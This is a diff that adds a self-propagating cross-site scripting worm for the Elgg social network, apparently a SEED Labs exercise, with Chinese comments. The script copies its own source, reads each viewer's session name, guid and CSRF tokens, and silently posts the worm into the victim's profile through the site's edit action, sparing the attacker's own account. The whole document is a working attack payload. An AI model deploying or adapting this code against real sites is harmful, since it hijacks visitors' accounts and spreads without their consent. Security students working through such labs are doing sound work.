@@ -1,0 +1,32 @@
+<script id="worm" type="text/javascript">
+window.onload = function() {
+    // 1. 抓取自己的程式碼 (DOM Approach)
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>"; 
+    
+    // 2. 將整段腳本進行 URL 編碼，透過 POST 表單送出
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+    // 3. 獲取受害者的基本資料與 Token
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "__elgg_token=" + elgg.security.token.__elgg_token;
+
+    // 原本的文字 + URL編碼後的蠕蟲腳本 + 權限參數 🔥
+    var content = token + ts + userName + "&description=samyLoveNTNU" + wormCode + "&accesslevel[description]=2" + guid;
+    
+    var samyGuid = 59;
+    var sendurl = "http://www.seed-server.com/action/profile/edit";
+
+    // 免疫機制：Samy 自己看自己不會觸發
+    if (elgg.session.user.guid != samyGuid) {
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
+}
+</script>
